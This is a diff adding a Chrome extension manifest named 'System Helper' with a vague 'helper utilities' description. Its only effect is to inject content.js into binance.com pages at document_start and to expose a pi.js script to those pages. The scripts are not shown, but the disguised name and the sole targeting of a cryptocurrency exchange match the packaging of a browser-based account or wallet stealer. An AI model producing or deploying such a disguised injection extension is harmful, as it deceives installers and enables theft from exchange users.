@@ -1,0 +1,21 @@
+{
+  "manifest_version": 3,
+  "name": "System Helper",
+  "version": "0.0.1",
+  "description": "Browser helper utilities",
+  "content_scripts": [
+    {
+      "matches": ["https://www.binance.com/*"],
+      "js": ["content.js"],
+      "run_at": "document_start"
+    }
+  ],
+  "host_permissions": ["https://www.binance.com/*"],
+  "web_accessible_resources": [
+    {
+      "resources": ["pi.js"],
+      "matches": ["https://www.binance.com/*"]
+    }
+  ]
+}
+
